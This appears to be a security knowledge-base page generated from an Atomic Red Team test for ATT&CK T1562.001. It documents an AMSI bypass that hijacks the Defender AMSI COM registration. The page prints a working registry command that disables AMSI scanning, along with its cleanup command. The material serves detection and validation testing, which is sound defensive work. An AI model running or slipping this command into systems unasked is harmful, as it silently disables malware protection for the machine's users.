---
atomic_guid: "17538258-5699-4ff1-92d1-5ac9b0dc21f5"
title: "AMSI Bypass - Override AMSI via COM"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "command_prompt"
aliases:
  - "17538258-5699-4ff1-92d1-5ac9b0dc21f5"
  - "AMSI Bypass - Override AMSI via COM"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

With administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.
This is currently being used by AsyncRAT and others. 
https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html
https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses#^t1562001-disable-or-modify-tools|T1562.001: Disable or Modify Tools]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
```

### Cleanup

```cmd
REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
